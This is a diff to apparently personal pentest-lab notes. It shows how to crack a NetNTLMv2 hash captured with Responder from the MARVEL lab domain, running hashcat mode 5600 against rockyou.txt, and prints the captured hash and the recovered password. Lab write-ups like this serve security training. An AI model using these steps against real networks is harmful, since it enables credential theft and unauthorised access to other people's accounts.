@@ -47,7 +47,7 @@ Image of the kali machine while the responder is "ON".
 
 ![[Pasted image 20240711195645.png]]
 
-- Use hashcat to identify the module `hashcat --help | grep NTLM`
+- Use hashcat to identify the module `hashcat --help | grep NTLM` or search hashcat modules online. As a result we can see that we can use 5600 module
 ```
 ┌──(root㉿kali)-[~]
 └─# hashcat --help | grep NTLM
@@ -59,4 +59,42 @@ Image of the kali machine while the responder is "ON".
                                                              
 ```
 
-Search hashcat modules
+- Now save the hash password in text file. I saved it in file hash.txt
+
+`mousepad hash.txt`
+```
+FCASTLE::MARVEL:8b8bd38f3a618157:60b54f81f03369a2530df21d74b371b8:010100000000000000b7632db2d3da01fd082be6bfdf8f5c0000000002000800450054004b00500001001e00570049004e002d004f005400450055005a004d0047005000330038004c0004003400570049004e002d004f005400450055005a004d0047005000330038004c002e00450054004b0050002e004c004f00430041004c0003001400450054004b0050002e004c004f00430041004c0005001400450054004b0050002e004c004f00430041004c000700080000b7632db2d3da010600040002000000080030003000000000000000000000000030000053fcbe58317e2568dcaf02cc2c507b2e065fa9a8f5ca10f03270654504da298e0a001000000000000000000000000000000000000900220063006900660073002f003100390032002e003100360038002e00360034002e0034000000000000000000
+```
+
+- now run the hashcat using module 5600
+```
+┌──(root㉿kali)-[~]
+└─# hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt       
+hashcat (v6.2.6) starting
+
+FCASTLE::MARVEL:8b8bd38f3a618157:60b54f81f03369a2530df21d74b371b8:010100000000000000b7632db2d3da01fd082be6bfdf8f5c0000000002000800450054004b00500001001e00570049004e002d004f005400450055005a004d0047005000330038004c0004003400570049004e002d004f005400450055005a004d0047005000330038004c002e00450054004b0050002e004c004f00430041004c0003001400450054004b0050002e004c004f00430041004c0005001400450054004b0050002e004c004f00430041004c000700080000b7632db2d3da010600040002000000080030003000000000000000000000000030000053fcbe58317e2568dcaf02cc2c507b2e065fa9a8f5ca10f03270654504da298e0a001000000000000000000000000000000000000900220063006900660073002f003100390032002e003100360038002e00360034002e0034000000000000000000:P@$$w0rd1
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)
+Hash.Target......: FCASTLE::MARVEL:8b8bd38f3a618157:60b54f81f03369a253...000000
+Time.Started.....: Thu Jul 11 17:33:40 2024 (1 sec)
+Time.Estimated...: Thu Jul 11 17:33:41 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1420.5 kH/s (0.67ms) @ Accel:256 Loops:1 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 2107392/14344385 (14.69%)
+Rejected.........: 0/2107392 (0.00%)
+Restore.Point....: 2105344/14344385 (14.68%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: PECKHAM -> Nike13
+
+Started: Thu Jul 11 17:33:26 2024
+Stopped: Thu Jul 11 17:33:42 2024
+
+```
+
+- As seen above the password is `P@$$w0rd1` . You can rerun it with --show`hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --show`
